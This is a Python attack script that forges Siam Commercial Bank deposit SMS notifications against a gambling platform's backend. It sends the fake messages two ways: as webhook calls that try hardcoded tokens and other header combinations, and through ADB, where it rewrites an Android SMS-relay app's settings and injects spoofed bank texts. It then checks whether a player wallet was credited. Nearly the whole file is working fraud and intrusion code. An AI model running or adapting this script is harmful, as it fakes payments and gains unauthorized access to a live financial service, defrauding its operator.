#!/usr/bin/env python3
"""
vak_scb.py — SCB webhook injection for vak88z2 (direct HTTP + ADB path)
Usage: python3 -I vak_scb.py <platform_scb_no> <user_bank:user_bank_no> <amount>

Examples:
  python3 -I vak_scb.py 162-437505-3 BBL:3037150079 1000
  python3 -I vak_scb.py 1624375053   KBANK:0543753327 500

Modes:
  --http-only   only try direct webhook calls
  --adb-only    only do APK reconfigure + ADB SMS inject
  (default: both)
"""
import sys, os, time, json, uuid, subprocess, requests, base64
from datetime import datetime, timezone, timedelta

# ── Config ───────────────────────────────────────────────────────────────────
TID_VAK  = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI    = f"https://{TID_VAK}pbapi.asdgapicenterssdo.com"
MGAPI    = f"https://{TID_VAK}mgapi.asdgapicenterssdo.com"
WEBHOOK  = f"{MGAPI}/webhook-scb"

PLAYER_PHONE = "0811111111"
PLAYER_PASS  = "Pwned2026!"

# C2 token from APK prefs (base64-payload format)
C2_TOKEN = "eyJfaWQiOiI2NzAzMTIzNDU2Nzg5MDEyMzQ1Njc4OTAiLCJpYXQiOjE3MjgzNzcwMDB9"
PAPDIEAW = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"

# APK package + prefs path
APK_PKG   = "com.example.appsms"
PREFS_PATH = f"/data/data/{APK_PKG}/shared_prefs/default.xml"

# ── Parse args ────────────────────────────────────────────────────────────────
args = [a for a in sys.argv[1:] if not a.startswith("--")]
flags = [a for a in sys.argv[1:] if a.startswith("--")]
http_only = "--http-only" in flags
adb_only  = "--adb-only"  in flags

if len(args) != 3:
    print(__doc__); sys.exit(1)

platform_scb_raw, user_bank_raw, amount_raw = args

if ":" not in user_bank_raw:
    print("user_bank must be BANK:ACCOUNT  e.g. BBL:3037150079"); sys.exit(1)
user_bank, user_account_no = user_bank_raw.split(":", 1)
user_bank = user_bank.upper()

try:
    amount_float = float(amount_raw.replace(",", ""))
    amount_fmt   = f"{amount_float:,.2f}"
except ValueError:
    print(f"Invalid amount: {amount_raw}"); sys.exit(1)

# ── SCB account masking ───────────────────────────────────────────────────────
def acct_mask(raw: str) -> str:
    """
    Thai bank masking: middle 6 of the 3-6-1 format (clean[3:9]).
      054-375332-7  → x375332
      162-437505-3  → x437505
      303-715007-9  → x715007  (BBL 3037150079)
    Fallback: last 6 excluding check digit.
    """
    clean = raw.replace("-", "").replace(" ", "")
    if len(clean) == 10:
        return "x" + clean[3:9]
    return "x" + clean[:-1][-6:]

platform_masked = acct_mask(platform_scb_raw)   # x437505
sender_masked   = acct_mask(user_account_no)    # x715007 (BBL 3037150079)

# ── Timestamps ────────────────────────────────────────────────────────────────
tz_th    = timezone(timedelta(hours=7))
now      = datetime.now(tz_th)
ts_ms    = int(now.timestamp() * 1000)
ts_ddmm  = now.strftime("%d/%m")
ts_yy    = now.strftime("%y")
ts_hhmm  = now.strftime("%H:%M")
sms_id   = str(uuid.uuid4()).replace("-", "")[:16]

# ── Build SMS messages ────────────────────────────────────────────────────────
# Matches pattrenScb in SmsActivity:
# (\d{2}\/\d{2})@(\d{2}:\d{2}) ([0-9,]*\.[0-9]{2}) จาก(\S{3,4})\/(x\d{6})เข้า(x\d{6})
msg_notification = (
    f"{ts_ddmm}@{ts_hhmm} {amount_fmt} "
    f"จาก{user_bank}/{sender_masked}เข้า{platform_masked}"
)

# Standard SCB deposit SMS (no pattern check needed — any body from 027777777)
msg_standard = (
    f"SCB-ALERT {ts_ddmm}/{ts_yy} {ts_hhmm} "
    f"เงินเข้าบช{platform_masked} {amount_fmt} บาท "
    f"จาก {user_bank} {sender_masked} "
    f"คงเหลือ {amount_fmt} บาท ref.{sms_id}"
)

msg_thai = (
    f"รับโอน {ts_ddmm}/{ts_yy} {ts_hhmm} "
    f"จาก {user_bank} {sender_masked} "
    f"เข้าบัญชี {platform_masked} {amount_fmt} บาท"
)

print(f"\n{'='*64}")
print(f"Target   : vak88z2 / {PLAYER_PHONE}")
print(f"Mule SCB : {platform_scb_raw} → {platform_masked}")
print(f"From     : {user_bank} {user_account_no} → {sender_masked}")
print(f"Amount   : {amount_fmt} THB")
print(f"Webhook  : {WEBHOOK}")
print(f"{'='*64}\n")

# ── Authenticate ─────────────────────────────────────────────────────────────
s = requests.Session()
print("[auth] vak88z2 player login...")
r = s.post(f"{PBAPI}/pb/authentication",
           json={"strategy": "local", "username": PLAYER_PHONE, "password": PLAYER_PASS},
           timeout=15)
player_jwt = r.json().get("accessToken", "")
print(f"       JWT {len(player_jwt)} chars | {r.status_code}")

def wallet():
    r2 = s.get(f"{MGAPI}/mb/wallet",
               headers={"Authorization": f"Bearer {player_jwt}", "template": "th"},
               timeout=10)
    try:    return r2.json().get("balance", "?")
    except: return "ERR"

bal_before = wallet()
print(f"       Wallet: {bal_before} THB\n")

# ── HTTP webhook attempts ─────────────────────────────────────────────────────
if not adb_only:
    print("─── HTTP webhook ───────────────────────────────────────")
    auth_matrix = [
        ("C2 token",           {"Authorization": f"Bearer {C2_TOKEN}"}),
        ("Player JWT",         {"Authorization": f"Bearer {player_jwt}"} if player_jwt else None),
        ("No auth",            {}),
        ("PAPDIEAW",           {"PAPDIEAW-KEY": PAPDIEAW}),
        ("C2 + PAPDIEAW",      {"Authorization": f"Bearer {C2_TOKEN}", "PAPDIEAW-KEY": PAPDIEAW}),
        ("Player + PAPDIEAW",  {"Authorization": f"Bearer {player_jwt}", "PAPDIEAW-KEY": PAPDIEAW} if player_jwt else None),
    ]

    msg_matrix = [
        ("notification", msg_notification),
        ("standard",     msg_standard),
        ("thai",         msg_thai),
    ]

    best_code = 999
    best_auth = {}

    for auth_label, auth_hdrs in auth_matrix:
        if auth_hdrs is None:
            continue
        # ReadSmsRequest fields from APK reverse (LuxSms-v3 com.example.appsms.api.request)
        # username/password = C2-issued per-device credentials stored in PrefUtil
        # (usernameSCB / passwordSCB prefs — populated after C2 /service/authenticate flow)
        body = {
            "address":   "027777777",
            "message":   msg_standard,
            "timestamp": ts_ms,
            "bank_no":   platform_scb_raw.replace("-", ""),
            "sms_id":    str(uuid.uuid4()).replace("-","")[:16],
            "type":      "sms_deposit",
            "bank_code": "SCB",
            "amount":    amount_fmt,
            "username":  os.environ.get("SCB_USER", ""),   # C2-issued; empty = 401
            "password":  os.environ.get("SCB_PASS", ""),   # C2-issued; empty = 401
        }
        hdrs = {"Content-Type": "application/json"}
        hdrs.update(auth_hdrs)
        r = requests.post(WEBHOOK, headers=hdrs, json=body, timeout=10)
        tag = "✓" if r.status_code == 200 else "✗"
        print(f"  {tag} [{auth_label:22s}] {r.status_code} | {r.text[:80].strip()}")
        if r.status_code < best_code:
            best_code = r.status_code
            best_auth = auth_hdrs

    if best_code == 200:
        print("\n  *** 200 via HTTP! Testing all message formats ***")
        for msg_label, msg in msg_matrix:
            body = {
                "address":  "027777777", "message": msg, "timestamp": ts_ms,
                "bank_no":  platform_scb_raw.replace("-", ""),
                "sms_id":   str(uuid.uuid4()).replace("-","")[:16],
                "type":     "sms_deposit", "bank_code": "SCB", "amount": amount_fmt,
                "username": os.environ.get("SCB_USER", ""),
                "password": os.environ.get("SCB_PASS", ""),
            }
            hdrs = {"Content-Type": "application/json"}
            hdrs.update(best_auth)
            r = requests.post(WEBHOOK, headers=hdrs, json=body, timeout=10)
            print(f"    [{msg_label:15s}] {r.status_code} | {r.text[:80].strip()}")
    print()

# ── ADB path: reconfigure APK + inject SMS ────────────────────────────────────
if not http_only:
    print("─── ADB path ───────────────────────────────────────────")

    def adb(cmd: str, capture=True) -> str:
        result = subprocess.run(f"adb {cmd}", shell=True,
                                capture_output=capture, text=True, timeout=15)
        return (result.stdout + result.stderr).strip()

    # Check device
    dev = adb("devices")
    print(f"  Devices: {dev.splitlines()[1] if len(dev.splitlines())>1 else 'none'}")
    if "emulator" not in dev and "device" not in dev:
        print("  No ADB device — skipping ADB path");
    else:
        # Build updated prefs XML pointing to vak88z2 with SCB enabled
        new_prefs = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="statusScbKPreference" value="true" />
    <boolean name="statusTrueKPreference" value="false" />
    <string name="baseUrlKPreference">https://{TID_VAK}mgapi.asdgapicenterssdo.com/</string>
    <string name="baseUrlLoginKPreference">https://{TID_VAK}mgapi.asdgapicenterssdo.com/</string>
    <string name="scbUrlKPreference">https://{TID_VAK}mgapi.asdgapicenterssdo.com/webhook-scb</string>
    <string name="kbankUrlKPreference">https://{TID_VAK}mgapi.asdgapicenterssdo.com/webhook-kbank</string>
    <string name="ktbUrlKPreference">https://{TID_VAK}mgapi.asdgapicenterssdo.com/webhook-sms</string>
    <string name="trueUrlKPreference">https://{TID_VAK}mgapi.asdgapicenterssdo.com/webhooks/sms/truewallet</string>
    <boolean name="statusHostKPreference" value="false" />
    <boolean name="statusKBankKPreference" value="false" />
    <boolean name="statusKTBKPreference" value="false" />
    <string name="scb_ownerKPreference">{PLAYER_PHONE}</string>
    <string name="kbank_ownerKPreference">{PLAYER_PHONE}</string>
    <string name="tokenKPreference">{C2_TOKEN}</string>
    <string name="headerKPreference">Bearer {C2_TOKEN}</string>
    <string name="scbTokenKPreference">{C2_TOKEN}</string>
    <string name="kbankTokenKPreference">{C2_TOKEN}</string>
    <string name="ktbTokenKPreference">{C2_TOKEN}</string>
    <string name="trueTokenKPreference">{C2_TOKEN}</string>
    <boolean name="isLoginKPreference" value="true" />
    <boolean name="statusKBankPromptpayKPreference" value="false" />
</map>"""

        # Write prefs to tmp file
        tmp_xml = "/home/kzp/.claude/jobs/3adfe284/tmp/vak_scb_prefs.xml"
        with open(tmp_xml, "w") as f:
            f.write(new_prefs)

        # Push to device
        push = adb(f"push {tmp_xml} /sdcard/vak_scb_prefs.xml")
        print(f"  Push: {push}")

        # Copy to prefs with root
        cp = adb(f"shell cp /sdcard/vak_scb_prefs.xml {PREFS_PATH}")
        print(f"  Copy prefs: {cp or 'ok'}")

        # Force-stop APK
        stop = adb(f"shell am force-stop {APK_PKG}")
        print(f"  Force-stop: {stop or 'ok'}")
        time.sleep(1)

        # Launch APK
        start = adb(f"shell am start -n {APK_PKG}/.p003ui.smslist.view.MainActivity")
        if "Error" in start:
            # Try main activity via intent
            start = adb(f"shell monkey -p {APK_PKG} -c android.intent.category.LAUNCHER 1")
        print(f"  Start APK: {start[:80]}")
        time.sleep(2)

        # Verify prefs applied
        prefs_check = adb(f"shell cat {PREFS_PATH}")
        if TID_VAK in prefs_check:
            print(f"  Prefs: ✓ vak88z2 TID confirmed")
        else:
            print(f"  Prefs: ✗ update may have failed")

        # Inject SMS from 027777777 (SCB sender)
        print(f"\n  Injecting SCB SMS (sender: 027777777)...")
        print(f"  Message: {msg_notification}")
        inject = adb(f'emu sms send 027777777 "{msg_notification}"')
        print(f"  ADB inject: {inject or 'ok'}")
        time.sleep(3)

        # Check logcat for webhook activity
        print("\n  Logcat (last 5s):")
        log = adb("logcat -d -t 80")
        for line in log.splitlines():
            if any(k in line.lower() for k in ["webhook","scb","027777","readsms","okhttp","retrofit","error"]):
                print(f"    {line}")

        # Also try notification format
        print(f"\n  Injecting SCB Connect notification format...")
        inject2 = adb(f'emu sms send 027777777 "{msg_standard}"')
        print(f"  ADB inject2: {inject2 or 'ok'}")
        time.sleep(3)

        log2 = adb("logcat -d -t 50")
        for line in log2.splitlines():
            if any(k in line.lower() for k in ["webhook","scb","027777","readsms","okhttp","error","exception"]):
                print(f"    {line}")

# ── Final balance ─────────────────────────────────────────────────────────────
print(f"\n─── Wallet ─────────────────────────────────────────────")
time.sleep(2)
bal_after = wallet()
print(f"  Before : {bal_before} THB")
print(f"  After  : {bal_after} THB")
if str(bal_before) != str(bal_after):
    print(f"\n  *** WALLET CHANGED: {bal_before} → {bal_after} THB ***")

print(f"\n─── SMS formats ────────────────────────────────────────")
print(f"  notification: {msg_notification}")
print(f"  standard    : {msg_standard}")
print(f"  thai        : {msg_thai}")
print(f"\n  ADB inject:")
print(f"  adb emu sms send 027777777 \"{msg_notification}\"")
print(f"{'='*64}")
